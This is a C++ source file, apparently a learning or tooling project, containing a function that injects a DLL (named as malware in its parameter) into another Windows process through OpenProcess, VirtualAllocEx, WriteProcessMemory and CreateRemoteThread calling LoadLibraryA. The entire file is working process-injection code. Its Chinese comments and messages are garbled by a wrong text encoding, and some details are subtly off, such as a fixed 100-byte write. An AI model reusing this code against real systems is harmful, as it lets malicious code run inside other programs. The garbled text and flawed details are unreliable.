#include "pch.h"
/**
 * Զ���߳�DLLע��
 * ����   processName
 * ����   malwareDLLPath
 */
VOID RemoteThreadInject(const TCHAR* processName, const TCHAR* malwareDLLPath)
{

	printf("\n��info����ʼԶ���߳�DLLע��...\n");
	//��Ŀ�����
	HANDLE hDestProcess = OpenProcessByName(processName, PROCESS_ALL_ACCESS);
	if (hDestProcess == 0)return;
	//�Ϸ����ж�(1):ȷ����ǰ���̺�Ŀ�����λ��һ�£�������ͬ��ַԶ�̵���Ŀ�����LoadLibrary()
	BOOL is32BitProcess = TRUE;
	IsWow64Process(hDestProcess, &is32BitProcess);
#if _IS_X86 
	if (is32BitProcess == FALSE)
	{
		printf("��error����ǰ������32λ��Ŀ�������64λ...\n");
		return;
	}
#elif _IS_X64
	if (is32BitProcess == TRUE)
	{
		printf("��error����ǰ������64λ��Ŀ�������32λ...\n");
		return;
	}
#endif
	//�Ϸ����ж�(2):32λ��Ŀ����̲��ܼ���64λDLL;
	if (is32BitProcess == TRUE)
	{
		PBYTE pFileBuffer;
		PEHEADER PEHeader;
		PEBODY PEBody;
		LoadFileBuffer(malwareDLLPath, &pFileBuffer);
		AnalyzePE_ByFileBuffer(pFileBuffer, &PEHeader, &PEBody);
		if (PEHeader.COFFHeader.Size_Of_Optional_Headers == 0xF0)
		{
			printf("��error��Ŀ�������32λ���޷�����64λDLL...");
			return;
		}
	}


	//��ȡ��ǰ������LoadLibraryA()������ַ
	HMODULE hKERNEL32 = GetModuleHandle(TEXT("KERNEL32.DLL"));
	LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKERNEL32, TEXT("LoadLibraryA"));
	if (pLoadLibrary == 0)
	{
		printf("��error����ȡ��ǰ����LoadLibraryA()������ַʧ��... \n");
		return;
	}
	//ΪDLL�����ַ��������㹻��Ŀռ�(100�ֽ�)����д��Ŀ�����
	LPVOID remoteAddr = VirtualAllocEx(hDestProcess, NULL, 100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (remoteAddr == NULL)
	{
		printf("��error����Ŀ���������ռ�ʧ�ܣ�code=%d \n", GetLastError());
		return;
	}
	if (WriteProcessMemory(hDestProcess, (LPVOID)remoteAddr, (LPCVOID)malwareDLLPath, 100, OUT NULL) == 0)
	{
		DWORD CODE = GetLastError();
		printf("��error����Ŀ�����д��DLL�����ַ���ʧ��,CODE=%d \n", CODE);
		getchar();
		return;
	}
	//����Զ���̣߳�����Ŀ������ڵ�LoadLibrary����
	DWORD remoteThreadID = 0;
	HANDLE hRemoteThread = CreateRemoteThread(hDestProcess, NULL, 0, pLoadLibrary, (LPVOID)remoteAddr, 0, OUT &remoteThreadID);
	if (hRemoteThread == NULL)
	{
		printf("����Զ���߳�ʧ��,CODE=%d (ע�������Ϊ64λ�ſ�ע��64λ����)\n", GetLastError());
		return;
	}
	printf("����Զ�̺�����ַ=%llX \n", pLoadLibrary);

	//�ȴ�Զ���߳̽���
	printf("��info������Զ���̳߳ɹ����ȴ�LoadLibraryA()����...\n");
	WaitForSingleObject(hRemoteThread, INFINITE);
	DWORD exitCode;
	GetExitCodeThread(hRemoteThread, OUT &exitCode);//�߳��˳��룬��LoadLibrary��������ֵ����ע���ģ���ַ
	if (exitCode == 0)
	{
		printf("��error��ע��ʧ�ܣ�LoadLibrary���ص�ģ���ַ=0x0 ����������ΪDLL·������ \n");
		CloseHandle(hRemoteThread);
		return;
	}
	printf("��info��ע��ɹ���Զ���߳��˳���(��LoadLibrary���ص�ģ���ַ)= %llX  \n", exitCode);
	CloseHandle(hRemoteThread);
	return;
}